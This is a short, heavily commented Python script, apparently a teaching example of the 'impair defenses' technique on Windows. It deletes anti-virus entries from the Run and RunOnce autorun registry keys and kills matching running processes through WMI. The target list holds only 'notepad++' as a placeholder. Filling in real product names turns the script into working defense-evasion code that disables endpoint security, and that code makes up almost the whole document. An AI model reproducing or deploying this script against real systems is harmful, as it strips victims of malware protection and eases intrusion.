# This script "impairs defenses" by killing running anti-virus programs and stopping them from Autostart'ing on the next boot.

import winreg,wmi,os,signal
# Python's wmi library allows Python to communicate with Windows Management Instrumentation, an API with enhanced access and 
# capabilities for interacting with all of the Windows OS functions.
# Python's signal library allows Python to initiate electric signals, such as Ctrl+C, which normally stops a process.

av_list = ["notepad++"]
# This is just an example; use this variable to create a list of names associated with anti-virus software.

reghives = [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]
regpaths = ["SOFTWARE\Microsoft\Windows\CurrentVersion\Run","SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"]
for reghive in reghives:
    for regpath in regpaths: 
    # The double for loop targets the 4 satndard Autorun Registry Keys in Windows systems.
        reg = winreg.ConnectRegistry(None,reghive)
        key = winreg.OpenKey(reg,regpath,0,access=winreg.KEY_READ)
        try:
            index = 0
            while True:
                val = winreg.EnumValue(key,index)
                for name in av_list:
                    if name in val[1]:
                        print("Deleting %s Autorun Key" % val[0])
                        key2 = winreg.OpenKey(reg,regpath,0,access=winreg.KEY_SET_VALUE)
                        winreg.DeleteValue(key2,val[0])
                        # This while loops sifts through each location specified in the for loops and deletes the values specified in the "av_list."
                index += 1
        except OSError:
            {}
        # The while loop is encased in a try block because it is unknown how many values are in each key.
        # Rather than run infinitely (because 'True'), the loop will close when an error is thrown (having no more values).
# So this entire block of code deletes anti-virus software from being Autostart'ed.

f = wmi.WMI()
for process in f.Win32_Process():
# After connecting to WMI, the loop creates a list of Windows processes,
    for name in av_list:
        if name in process.Name:
        # sees if any of those processes are in the av_list,
            os.kill(int(process.processId),signal.SIGTERM)
            # and then kills them.
